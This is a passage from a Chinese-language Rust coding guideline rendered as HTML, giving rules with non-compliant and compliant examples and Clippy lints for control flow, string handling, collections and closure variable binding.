<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
if let Some(value) = opt {
  ...
}
// 符合
if let [first, ..] = list {
  ...
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gctf01-当需要通过多个if判断来比较大小来区分不同情况时优先使用match和cmp来代替if表达式"><a class="header" href="#gctf01-当需要通过多个if判断来比较大小来区分不同情况时优先使用match和cmp来代替if表达式">G.CTF.01 当需要通过多个<code>if</code>判断来比较大小来区分不同情况时，优先使用<code>match</code>和<code>cmp</code>来代替<code>if</code>表达式</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在使用多个<code>if-else</code>来对不同情况进行区分时，使用 <code>match</code> 和 <code>cmp</code> 代替 <code>if</code> 的好处是语义更加明确，而且也能帮助开发者穷尽所有可能性。
但是这里需要注意这里使用 <code>match</code> 和 <code>cmp</code> 的性能要低于 <code>if</code>表达式，因为 一般的 <code>&gt;</code> 或 <code>&lt;</code> 等比较操作是内联的，而 <code>cmp</code>方法没有内联。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn a() {}
fn b() {}
fn c() {}
fn f(x: u8, y: u8) {
    // 不符合
    if x &gt; y {
        a()
    } else if x &lt; y {
        b()
    } else {
        c()
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::cmp::Ordering;
fn a() {}
fn b() {}
fn c() {}
fn f(x: u8, y: u8) {
    // 符合
     match x.cmp(&amp;y) {
         Ordering::Greater =&gt; a(),
         Ordering::Less =&gt; b(),
         Ordering::Equal =&gt; c()
     }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#comparison_chain">comparison_chain</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gctf02-if条件表达式分支中如果包含了else-if分支也应该包含else分支"><a class="header" href="#gctf02-if条件表达式分支中如果包含了else-if分支也应该包含else分支">G.CTF.02 <code>if</code>条件表达式分支中如果包含了<code>else if</code>分支也应该包含<code>else</code>分支</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>这样做有助于代码逻辑更加健壮清晰，在一些要求严格的编码规范中要求这么做，比如《MISRA-C:2004 Rule 14.10》编码规范。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#[warn(clippy::else_if_without_else)]
fn a() {}
fn b() {}

fn main(){
    let x: i32 = 1;
    if x.is_positive() {
        a();
    } else if x.is_negative() {
        b();
    } // 不符合：没有 else 分支
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#[warn(clippy::else_if_without_else)]
fn a() {}
fn b() {}

fn main(){
    let x: i32 = 1;
    if x.is_positive() {
        a();
    } else if x.is_negative() {
        b();
    } else {
        // 符合
    }
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#else_if_without_else">else_if_without_else</a></td><td>yes</td><td>no</td><td><strong>restriction</strong></td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gctf03-如果要通过-if-条件表达式来判断是否-panic请优先使用断言"><a class="header" href="#gctf03-如果要通过-if-条件表达式来判断是否-panic请优先使用断言">G.CTF.03 如果要通过 <code>if</code> 条件表达式来判断是否 Panic，请优先使用断言</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>略</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let sad_people: Vec&lt;&amp;str&gt; = vec![];
// 不符合
if !sad_people.is_empty() {
    panic!(&quot;there are sad people: {:?}&quot;, sad_people);
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let sad_people: Vec&lt;&amp;str&gt; = vec![];
// 符合
assert!(sad_people.is_empty(), &quot;there are sad people: {:?}&quot;, sad_people);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#if_then_panic">if_then_panic</a></td><td>yes</td><td>no</td><td>Style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gctf04-在-match-分支的-guard-语句中不要使用带有副作用的条件表达式"><a class="header" href="#gctf04-在-match-分支的-guard-语句中不要使用带有副作用的条件表达式">G.CTF.04 在 Match 分支的 Guard 语句中不要使用带有副作用的条件表达式</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>因为在 mactch 分支中， 匹配几次就会执行 Guard 几次。如果携带副作用，会产生意料之外的情况。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 不符合：下面代码会输出两次 &quot;ha&quot;
fn main() {
    use std::cell::Cell;
    let i: Cell&lt;i32&gt; = Cell::new(0);
    match 1 {
        1 | _  // 这里匹配两次
            if { // 这个 Guard 条件表达式带有副作用：打印，因为匹配两次，所以会执行两次
                println!(&quot;ha&quot;);
                i.set(i.get() + 1);
                false
            } =&gt; {}
        _ =&gt; {}
    }
    assert_eq!(i.get(), 2);
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="37-字符串"><a class="header" href="#37-字符串">3.7 字符串</a></h1>
<p>Rust 中字符串是有效的 UTF-8 编码的字节数组。</p>
<p>Rust 字符串类型众多，但本节内容主要围绕 ：<code>String</code> / <code>&amp;str</code></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pstr01---处理字符串元素时优先按字节处理而非字符"><a class="header" href="#pstr01---处理字符串元素时优先按字节处理而非字符">P.STR.01   处理字符串元素时优先按字节处理而非字符</a></h2>
<p><strong>【描述】</strong></p>
<p>处理字符串有两种方式，一种是按字符处理，即把字符串转为字符数组<code>[char]</code>，另一种是直接按字节处理<code>[u8]</code>。</p>
<p>两者之间的一些区别：</p>
<ul>
<li><code>[char]</code>  保证是有效的 Unicode，但不一定是有效的 UTF-8，一般将其看作是 UTF-32 。将字符数组转换为字符串需要注意。</li>
<li><code>[u8]</code> 不一定是有效的字符串，它比 <code>[char]</code> 节省内存。将其转换为字符串需要检查 <code>UTF-8</code>编码。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pstr02---创建字符串时宜预先分配大约足够的容量来避免后续操作中产生多次分配"><a class="header" href="#pstr02---创建字符串时宜预先分配大约足够的容量来避免后续操作中产生多次分配">P.STR.02   创建字符串时，宜预先分配大约足够的容量来避免后续操作中产生多次分配</a></h2>
<p><strong>【描述】</strong></p>
<p>预分配足够的容量，避免后续内存分配，可以提升代码性能。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut output = String::new();
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut output = String::with_capacity(input.len());
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pstr03-在使用内建字符串处理函数或方法的时候应注意避免隐藏的嵌套迭代或多次迭代"><a class="header" href="#pstr03-在使用内建字符串处理函数或方法的时候应注意避免隐藏的嵌套迭代或多次迭代">P.STR.03 在使用内建字符串处理函数或方法的时候，应注意避免隐藏的嵌套迭代或多次迭代</a></h2>
<p><strong>【描述】</strong></p>
<p>比如 <code>contains</code> 函数的实现就是按字符遍历字符串，但是如果你将它用于一个字符串的迭代处理中，就会产生嵌套迭代，时间复杂度从你以为的 <code>O(n)</code> 变成了 <code>O(n^2)</code>。没有将其用于迭代中，也有可能产生多次迭代，<code>O(n)</code> 变为 <code>O(n+m)</code> 。 为了避免这个问题，我们可以用 <code>find</code>  来代替 <code>contains</code>。</p>
<p>所以，在使用内建函数的时候要注意它的实现，选择合适的函数或方法，来避免这类问题。</p>
<p><strong>【示例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 对输入的字符串进行转义
pub fn find&lt;'a, S: Into&lt;Cow&lt;'a, str&gt;&gt;&gt;(input: S) -&gt; Cow&lt;'a, str&gt; {
    let input = input.into();
    fn is_trouble(c: char) -&gt; bool {
        c == '&lt;' || c == '&gt;' || c == '&amp;'
    }
    
    // 使用 find 而非 contains
    // find 使用模式查找，可以返回匹配字符的位置信息
    let first = input.find(is_trouble);
    
    // 利用 find 的位置信息，避免第二次遍历
    if let Some(first) = first {
        let mut output = String::from(&amp;input[0..first]);
        output.reserve(input.len() - first);
        let rest = input[first..].chars();
        for c in rest {
            match c {
                '&lt;' =&gt; output.push_str(&quot;&amp;lt;&quot;),
                '&gt;' =&gt; output.push_str(&quot;&amp;gt;&quot;),
                '&amp;' =&gt; output.push_str(&quot;&amp;amp;&quot;),
                _ =&gt; output.push(c),
            }
        }

        Cow::Owned(output)
    } else {
        input.into()
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pstr04-在使用-cowa-b-时要注意选择合理场景以便最大化地优化性能"><a class="header" href="#pstr04-在使用-cowa-b-时要注意选择合理场景以便最大化地优化性能">P.STR.04 在使用 <code>Cow&lt;'a, B&gt; </code>时要注意选择合理场景以便最大化地优化性能</a></h2>
<p><strong>【描述】</strong></p>
<p><code>Cow&lt;'a, B&gt;</code> 可以减少不必要的内存拷贝。Cow 代表 Clone-On-Write，意味着，使用它可以只在必要的时候再进行拷贝。</p>
<p>但它并不是万能的，只有在需要大量读取数据但仅有少量情况需要修改时，<code>Cow&lt;'a, B&gt;</code> 才能真正起到优化性能的作用。</p>
<p>如果不在意依赖库过多，编译文件更大，也可以使用第三方库 <code>regex</code> 来处理大数据的搜索匹配和替换等需求，性能更佳。</p>
<p><strong>【反例】</strong></p>
<p>假设场景一：要处理的大文件中，至少一半数据包含转义符号</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合：这种情况在输入不包含转义符号的数据时，也需要对所有字符进行匹配处理，性能较低
pub fn naive(input: &amp;str) -&gt; String {
    let mut output = String::new();
    for c in input.chars() {
        match c {
            '&lt;' =&gt; output.push_str(&quot;&amp;lt;&quot;),
            '&gt;' =&gt; output.push_str(&quot;&amp;gt;&quot;),
            '&amp;' =&gt; output.push_str(&quot;&amp;amp;&quot;),
            _ =&gt; output.push(c)
        }
    }
    output
}
<span class="boring">}
</span></code></pre></pre>
<p>假设场景二：要处理的大文件中，几乎所有数据都包含转义符号。这种场景下，使用 <code>Cow&lt;'a, B&gt;</code> 对性能也无法起到太大的优化作用，此时宜尝试使用 <code>regex</code> 之类的高性能第三方库处理。</p>
<p><strong>【正例】</strong></p>
<p>假设场景一：要处理的大文件中，至少一半数据包含转义符号。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 对输入的字符串进行转义
// 符合： 性能提升大概 1 倍
pub fn naive&lt;'a, S: Into&lt;Cow&lt;'a, str&gt;&gt;&gt;(input: S) -&gt; Cow&lt;'a, str&gt; {
    let input = input.into();
    fn is_trouble(c: char) -&gt; bool {
        c == '&lt;' || c == '&gt;' || c == '&amp;'
    }

    if input.contains(is_trouble) {
        let mut output = String::with_capacity(input.len());
        for c in input.chars() {
            match c {
                '&lt;' =&gt; output.push_str(&quot;&amp;lt;&quot;),
                '&gt;' =&gt; output.push_str(&quot;&amp;gt;&quot;),
                '&amp;' =&gt; output.push_str(&quot;&amp;amp;&quot;),
                _ =&gt; output.push(c)
            }
        }
        // 只有在字符串修改的时候才使用 String
        Cow::Owned(output)
    } else {
        //其他情况使用 &amp;str
        input
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pstr05---在拼接字符串时优先使用format"><a class="header" href="#pstr05---在拼接字符串时优先使用format">P.STR.05   在拼接字符串时，优先使用<code>format!</code></a></h2>
<p><strong>【描述】</strong></p>
<p>在Rust中有很多方法可以连接字符串，不同的连接方法适用于不同的场景，性能也会有所差别。</p>
<p><strong>【示例】</strong></p>
<pre><pre class="playground"><code class="language-rust"> // 组合字符串是最简单和直观的方法，尤其是在字符串和非字符串混合的情况下。
 fn main() {
	let name = &quot;world!&quot;;
	let hw = format!(&quot;Hello {}!&quot;, name);
	println!(&quot;{:#?}&quot;, hw);
 }
 
 // 在追加字符串的时候，可以使用`push_str`方法,`push_str`性能比`format!`更好
 fn main() {
    let mut hw = String::new();
    hw.push_str(&quot;hello&quot;);
    hw.push_str(&quot; world!&quot;);
    println!(&quot;{:#?}&quot;, hw);
}

 // 通过`concat()`方法将字符串数组拼接成一个字符串
 fn main() {
    let hw = [&quot;hello&quot;, &quot; &quot;, &quot;world!&quot;].concat();
    println!(&quot;{:#?}&quot;, hw);
 }
 
 // 通过`join()`方法将字符串数组拼接成一个字符串
 fn main() {
    let hw_1 = [&quot;hello&quot;, &quot;world!&quot;].join(&quot;&quot;);
    println!(&quot;{:#?}&quot;, hw_1);
	// 输出：
	// helloworld!
	
    // 使用`join()`方法在拼接字符串时添加或指定字符
    let hw_2 = [&quot;hello&quot;, &quot;world!&quot;].join(&quot;+&quot;);
    println!(&quot;{:#?}&quot;, hw_2);
	// 输出：
	// hello+world!
 }
 
 // 使用`collect()`方式对数组中的字符串进行拼接
 fn main() {
    let hw = [&quot;hello&quot;, &quot; &quot;, &quot;world!&quot;];
    let res: String = hw.iter().map(|x| *x).collect();
    println!(&quot;{:#?}&quot;, res);
 }
 
 // 使用符号`+`进行字符串拼接
 fn main() {
    let hw_1 = &amp;(String::from(&quot;hello&quot;) + &amp;String::from(&quot; &quot;) + &amp;String::from(&quot;world!&quot;));
    println!(&quot;{:#?}&quot;, hw_1);
    
    let hw_2 = &amp;(String::from(&quot;hello&quot;) + &quot; &quot; + &quot;world!&quot;);
    println!(&quot;{:#?}&quot;, hw_2);
    
    let hw_3 = &amp;(&quot;hello&quot;.to_owned() + &quot; &quot; + &quot;world!&quot;);
    println!(&quot;{:#?}&quot;, hw_3);

    let hw_4 = &amp;(&quot;hello&quot;.to_string() + &quot; &quot; + &quot;world!&quot;);
    println!(&quot;{:#?}&quot;, hw_4);
 }
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gstr01--在实现display特质时不应调用to_string方法"><a class="header" href="#gstr01--在实现display特质时不应调用to_string方法">G.STR.01  在实现<code>Display</code>特质时不应调用<code>to_string()</code>方法</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>因为 <code>to_string</code> 是间接通过 <code>Display</code> 来实现的，如果实现 <code>Display</code> 的时候再使用 <code>to_tring</code> 的话，将会无限递归。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::fmt;

struct Structure(i32);
impl fmt::Display for Structure {
    fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result {
        write!(f, &quot;{}&quot;, self.to_string()) // 不符合
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::fmt;

struct Structure(i32);
impl fmt::Display for Structure {
    fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result {
        write!(f, &quot;{}&quot;, self.0) // 符合
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#to_string_in_display">to_string_in_display</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gstr02--在追加字符串时使用push_str方法"><a class="header" href="#gstr02--在追加字符串时使用push_str方法">G.STR.02  在追加字符串时使用<code>push_str</code>方法</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>增强代码的可读性</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::string_add_assign, clippy::string_add)]

<span class="boring">fn main() {
</span>let mut x = &quot;Hello&quot;.to_owned();
x = x + &quot;, World&quot;; // 不符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::string_add_assign, clippy::string_add)]

<span class="boring">fn main() {
</span>let mut x = &quot;Hello&quot;.to_owned();

// More readable
x += &quot;, World&quot;;
x.push_str(&quot;, World&quot;); // 符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#string_add_assign">string_add_assign</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#string_add">string_add</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gstr03---将只包含-ascii字符的字符串字面量转为字节序列可以直接使用bstr-语法代替调用as_bytes方法"><a class="header" href="#gstr03---将只包含-ascii字符的字符串字面量转为字节序列可以直接使用bstr-语法代替调用as_bytes方法">G.STR.03   将只包含 <code>ASCII</code>字符的字符串字面量转为字节序列可以直接使用<code>b&quot;str&quot;</code> 语法代替调用<code>as_bytes</code>方法</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>这是为了增强可读性，让代码更简洁。</p>
<p>注意，<code>&quot;str&quot;.as_bytes()</code> 并不等价于  <code>b&quot;str&quot;</code>，而是等价于 <code>&amp;b&quot;str&quot;[..]</code>  。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::string_lit_as_bytes)]
<span class="boring">fn main() {
</span>// 不符合
let bs = &quot;a byte string&quot;.as_bytes();
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::string_lit_as_bytes)]
<span class="boring">fn main() {
</span>// 符合
let bs = b&quot;a byte string&quot;;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#string_lit_as_bytes">string_lit_as_bytes</a></td><td>yes</td><td>no</td><td>nursery</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gstr04---需要辨别字符串的字符开头或结尾字符时不应按字符迭代比较"><a class="header" href="#gstr04---需要辨别字符串的字符开头或结尾字符时不应按字符迭代比较">G.STR.04   需要辨别字符串的字符开头或结尾字符时，不应按字符迭代比较</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>Rust 语言核心库和标准库都对字符串内置了一些方便的方法来处理这类需求。</p>
<p>迭代字符的性能虽然也很快（对500多个字符迭代转义处理大概需要4.5微秒左右），但这种场景用迭代的话，代码可读性更差一些。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let name = &quot;_&quot;;
// 不符合
name.chars().last() == Some('_') || name.chars().next_back() == Some('-');

let name = &quot;foo&quot;;
// 不符合
if name.chars().next() == Some('_') {};
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let name = &quot;_&quot;;
// 符合
name.ends_with('_') || name.ends_with('-');

let name = &quot;foo&quot;;
// 符合
if name.starts_with('_') {};
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#chars_last_cmp">chars_last_cmp</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#chars_next_cmp">chars_next_cmp</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gstr05---对字符串按指定位置进行切片的时候需要小心破坏其-utf-8-编码"><a class="header" href="#gstr05---对字符串按指定位置进行切片的时候需要小心破坏其-utf-8-编码">G.STR.05   对字符串按指定位置进行切片的时候需要小心破坏其 UTF-8 编码</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>字符串默认是合法的 <code>UTF-8</code>字节序列，如果通过指定索引位置来对字符串进行切片，有可能破坏其合法 <code>UTF-8</code> 编码，除非这个位置是确定的，比如按 <code>char_indices</code> 方法来定位是合法的。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::string_slice)]

fn main(){ 
    let s = &quot;Ölkanne&quot;;
    // 不符合
    // 字节索引 1 不是字符的边界，所以程序会 panic 
    // `Ölkanne` 的 'Ö' 是 字节 `0..2`
    let sub_s = &amp;s[1..];
    // println!(&quot;{:?}&quot;, sub_s);
}

</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![allow(clippy::string_slice)]

fn main(){
    let s = &quot;Ölkanne&quot;;
    let mut char_indices = s.char_indices();
    assert_eq!(Some((0, 'Ö')), char_indices.next());
    // assert_eq!(Some((2, 'l')), char_indices.next()); 
    let pos = if let Some((pos, _)) = char_indices.next(){ pos } else {0};
    // 符合：计算出了正确的字符位置
    // 注意，这里 lint 检查工具可能误报，但这里是合法的，所以将lint设置为 allow
    let sub_s = &amp;s[pos..];
    assert_eq!(&quot;lkanne&quot;, sub_s);
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#string_slice">string_slice</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="38-集合类型"><a class="header" href="#38-集合类型">3.8 集合类型</a></h1>
<p>Rust 中的集合类型包括四大类：</p>
<ul>
<li>线性序列： <a href="https://doc.rust-lang.org/stable/std/vec/struct.Vec.html"><code>Vec</code></a>, <a href="https://doc.rust-lang.org/stable/std/collections/struct.VecDeque.html"><code>VecDeque</code></a>, <a href="https://doc.rust-lang.org/stable/std/collections/struct.LinkedList.html"><code>LinkedList</code></a></li>
<li>映射集：<a href="https://doc.rust-lang.org/stable/std/collections/hash_map/struct.HashMap.html"><code>HashMap</code></a>, <a href="https://doc.rust-lang.org/stable/std/collections/struct.BTreeMap.html"><code>BTreeMap</code></a></li>
<li>集合： <a href="https://doc.rust-lang.org/stable/std/collections/hash_set/struct.HashSet.html"><code>HashSet</code></a>, <a href="https://doc.rust-lang.org/stable/std/collections/struct.BTreeSet.html"><code>BTreeSet</code></a></li>
<li>其他： <a href="https://doc.rust-lang.org/stable/std/collections/struct.BinaryHeap.html"><code>BinaryHeap</code></a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pclt01-创建hashmapvecdeque时可以预先分配大约足够的容量来避免后续操作中产生多次分配"><a class="header" href="#pclt01-创建hashmapvecdeque时可以预先分配大约足够的容量来避免后续操作中产生多次分配">P.CLT.01 创建HashMap、VecDeque时，可以预先分配大约足够的容量来避免后续操作中产生多次分配</a></h2>
<p><strong>【描述】</strong></p>
<p>预分配足够的容量，避免后续内存分配，可以提升代码性能。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use std::collections::HashMap;
use std::collections::VecDeque;

fn main() {

    // 不符合
    let mut map = HashMap::new();
    map.insert(&quot;a&quot;, 1);
    map.insert(&quot;b&quot;, 2);
    map.insert(&quot;c&quot;, 3);
    println!(&quot;{:#?}&quot;, map);
    
    // 不符合
    let mut deque = VecDeque::new();
    deque.push_back(1);
    deque.push_back(2);
    deque.push_back(3);
    println!(&quot;{:#?}&quot;, deque);
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use std::collections::HashMap;
use std::collections::VecDeque;

fn main() {

    // 符合
    let mut map = HashMap::with_capacity(3);
    map.insert(&quot;a&quot;, 1);
    map.insert(&quot;b&quot;, 2);
    map.insert(&quot;c&quot;, 3);
    println!(&quot;{:#?}&quot;, map);
    
    // 符合
    let mut deque = VecDeque::with_capacity(3);
    deque.push_back(1);
    deque.push_back(2);
    deque.push_back(3);
    println!(&quot;{:#?}&quot;, deque);
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gclt01-非必要情况下不要使用linkedlist而用vec或vecdeque代替"><a class="header" href="#gclt01-非必要情况下不要使用linkedlist而用vec或vecdeque代替">G.CLT.01 非必要情况下，不要使用<code>LinkedList</code>，而用<code>Vec</code>或<code>VecDeque</code>代替</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>一般情况下，有 <code>Vec</code>和<code>VecDeque</code> 性能更好。<code>LinkedList</code> 存在内存浪费，缓存局部性（Cache Locality）比较差，无法更好地利用CPU 缓存机制，性能很差。</p>
<p>只有在有大量的 列表 拆分 和 合并 操作时，才真正需要链表，因为链表允许你只需操作指针而非复制数据来完成这些操作。 </p>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#linkedlist">linkedlist</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<p>该 lint 对应 <code>clippy.toml</code> 配置项：</p>
<pre><code class="language-toml"># 如果函数是被导出的 API，则该 lint 不会被触发，是防止 lint 建议对 API 有破坏性的改变。默认为 true
avoid-breaking-exported-api=true 
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="39-函数设计"><a class="header" href="#39-函数设计">3.9 函数设计</a></h1>
<p>创建函数或使用闭包时需要注意的地方。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfud01---传递到闭包的变量建议单独重新绑定"><a class="header" href="#pfud01---传递到闭包的变量建议单独重新绑定">P.FUD.01   传递到闭包的变量建议单独重新绑定</a></h2>
<p><strong>【描述】</strong></p>
<p>默认情况下，闭包通过借用来捕获环境变量。或者，可以使用 <code>move</code> 关键字来移动环境变量到闭包中。</p>
<p>将这些要在闭包内用的变量，重新进行分组绑定，可读性更好。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::rc::Rc;

let num1 = Rc::new(1);
let num2 = Rc::new(2);
let num3 = Rc::new(3);
let closure = {
    // `num1` 所有权已经转移
    let num2 = num2.clone();  
    let num3 = num3.as_ref(); 
    move || {
        *num1 + *num2 + *num3; // 不符合
    }
};
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::rc::Rc;

let num1 = Rc::new(1);
let num2 = Rc::new(2);
let num3 = Rc::new(3);
// 符合： 单独对要传递到闭包的变量重新绑定
let num2_cloned = num2.clone();
let num3_borrowed = num3.as_ref();
let closure = move || {
    *num1 + *num2_cloned + *num3_borrowed; // 符合
};
<span class="boring">}
</span></code></pre></pre>
